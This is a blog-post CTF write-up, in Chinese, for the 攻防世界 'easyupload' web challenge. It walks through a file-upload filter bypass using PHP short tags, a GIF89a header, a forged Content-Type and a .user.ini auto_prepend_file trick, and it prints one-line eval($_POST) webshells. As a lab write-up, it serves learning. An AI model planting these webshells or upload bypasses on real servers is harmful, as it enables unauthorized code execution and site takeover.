@@ -1,0 +1,127 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>攻防世界-easyupload | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>攻防世界-easyupload</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-08-02T09:29:37.570Z" id="date"> 2023-08-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-02T10:40:00.899Z" id="updated"> 2023-08-02</time></div></span><br><span>Word Count: <div class="control">1.2k</div></span><br><span>Read Time: <div class="control">4 min</div></span></div></div><hr><div id="post-content"><h1>题目描述：</h1>
+<p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p>
+<h1>题目解题：</h1>
+<p>这题解释长知识了（还是太菜~）</p>
+<p>首先毕竟是新手题目，于是自己摸索了一会儿，首先就是上传shell.php发现失败，猜测肯定是过滤了php后缀啥的，暂不考虑后缀名绕过了，这有点太小儿科了，随后bp抓包修改了php后缀发现仍然没用，那肯定就是会检测文件内容的，之后尝试了一个很正常的jpg图片，成功上传，这提示我们文件类型也得正确（这也是后续要绕过的），之后尝试了图片马，依旧错误，更加确定会检测文件内容。之后尝试特殊的文件如.htaccess文件与.usr.ini文件，前者上传失败，而后者返回如下图的信息</p>
+<p class='item-img' data-src='image-20230802175745922.png'><img src="image-20230802175745922.png" alt="image-20230802175745922"></p>
+<p>这表明这个路线有说法，这里信息告诉我们文件类型有问题，当时只是觉得修改type类型即可，但还是会失败，然后我就知识盲区了，随后看了wp，发现这道题会检测文件头，文件头符合图片文件类型的才可以。</p>
+<p><strong>开始解题</strong></p>
+<p>参考wp发现：</p>
+<p>本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行</p>
+<p>这里需要绕过的点如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cobol">检查文件内容是否有php字符串<br><br>检查后缀中是否有htaccess或ph<br>      <br>检查文件头部信息<br><br>文件MIME类型<br></code></pre></td></tr></table></figure>
+<p>对于第一点可以利用短标签绕过，例如<?=phpinfo();?></p>
+<p>这里补充一下知识：</p>
+<p>php中最常见的标签为<?php ?></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;<br></code></pre></td></tr></table></figure>
+<p>不过在题目上传时可能会被waf过滤掉php关键字。根据查询结果，还有四种php的标签，分别是：</p>
+<p>①<? ?> 仅在配置short_open_tag=on时可以使用，适合执行php语句；</p>
+<p>②<?= ?>即使配置short_open_tag=off时依然可以使用，相当于<?php echo ?>，适合输出php语句~</p>
+<p>上述二者的短标签都不必闭合（即?&gt;可以省略不写，也可以连接成功）~</p>
+<pre><code>&lt;?  @eval($_POST['a']);?&gt;
+ 
+&lt;?= @eval($_POST['a']);?&gt;
+ 
+&lt;?  @eval($_POST['a']);
+ 
+&lt;?= @eval($_POST['a']);
+</code></pre>
+<p>③&lt;% %&gt; 据说需要配置php.ini文件中asp_tags=on（php.ini默认状态下是关闭的），但该作者未在php.ini中找到该选项…</p>
+<p>④<script language="php"></script>  php7及之后官方就已经不支持的写法</p>
+<p><strong>php短标签参考1：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dongguol/p/5910617.html">php中的短标签 太坑人了 - dongguol - 博客园 (cnblogs.com)</a></p>
+<p><strong>php短标签参考2：</strong><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8107#toc-11">无字母数字webshell总结 - 先知社区 (aliyun.com)</a></p>
+<p>对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
+<p>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。<br>
+这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。<br>
+其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</p>
+<p>第三点绕过方式即在文件头部添加一个图片的文件头，比如GIF89a</p>
+<p>图片马需要在.php文件前增加文件头，上传时偶尔需要配合burpsuite抓包修改content-type，常见图片搭配格式如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>文件格式</th>
+<th>php 文件头</th>
+<th>content-type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>.jpg .jpe .jpeg</td>
+<td>JPGGraphic File</td>
+<td>image/jpeg</td>
+</tr>
+<tr>
+<td>.png</td>
+<td>PNG Image File</td>
+<td>image/png</td>
+</tr>
+<tr>
+<td>.gif</td>
+<td>GIF 89A</td>
+<td>image/gif</td>
+</tr>
+</tbody>
+</table>
+<p>若题目要求上传其他格式的文件，如doc、pdf、dwg等，可以参考下面的博文：</p>
+<p><strong>图片马参考1：</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865">文件头_iqiqiya的博客-CSDN博客_gif文件头</a></p>
+<p><strong>图片马参考2：</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30233335/article/details/115195849">Content-type_瀚忄的博客-CSDN博客</a></p>
+<p>第四点绕过方法即修改上传时的Content-Type</p>
+<p>因此最终的payload为：上传.user.ini，内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GIF89a                  <br>auto_prepend_file=a.jpg<br></code></pre></td></tr></table></figure>
+<p>上传a.jpg，内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这里也涨知识了，在文件内容头部添加GIF89a居然也可以？</p>
+<p class='item-img' data-src='image-20230802181405808.png'><img src="image-20230802181405808.png" alt="image-20230802181405808"></p>
+<p>接着上传图片马</p>
+<p class='item-img' data-src='image-20230802181516414.png'><img src="image-20230802181516414.png" alt="image-20230802181516414"></p>
+<p>F12查看文件去向，原因是你上传的图片马会被该网站同目录下的正常php文件所包含，因此你要知道你在上传图片之后，被哪个php文件包含</p>
+<p class='item-img' data-src='image-20230802182151315.png'><img src="image-20230802182151315.png" alt="image-20230802182151315"></p>
+<p>接着我们蚁剑连接即可</p>
+<p class='item-img' data-src='image-20230802182512913.png'><img src="image-20230802182512913.png" alt="image-20230802182512913"></p>
+<p>成功找到flag</p>
+<p class='item-img' data-src='image-20230802182723280.png'><img src="image-20230802182723280.png" alt="image-20230802182723280"></p>
+<p>当然我们也可以访问该网址进行手动探索</p>
+<p class='item-img' data-src='image-20230802182751729.png'><img src="image-20230802182751729.png" alt="image-20230802182751729"></p>
+<p class='item-img' data-src='image-20230802182822353.png'><img src="image-20230802182822353.png" alt="image-20230802182822353"></p>
+<p>成功找到flag，在这里也遇到个神奇的问题，我在上传一段时间后，该木马文件失效了，这里也不知道是何原因</p>
+<p class='item-img' data-src='image-20230802183134655.png'><img src="image-20230802183134655.png" alt="image-20230802183134655"></p>
+<h1>参考文章：</h1>
+<p><a target="_blank" rel="noopener" href="https://baimao.blog.csdn.net/article/details/126633686?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~ESLANDING~default-3-126633686-blog-127869260.pc_relevant_landingrelevant&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~ESLANDING~default-3-126633686-blog-127869260.pc_relevant_landingrelevant&amp;utm_relevant_index=6">复现wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42789937/article/details/128356918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169096978116800213058244%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169096978116800213058244&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-128356918-null-null.142%5Ev92%5EchatsearchT3_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Ceasyupload&amp;spm=1018.2226.3001.4187">基础知识文章参考</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileinclude/">← Next 攻防世界-fileinclude</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/29/%E6%B5%85%E6%9E%90%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞 Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">题目解题：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">参考文章：</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
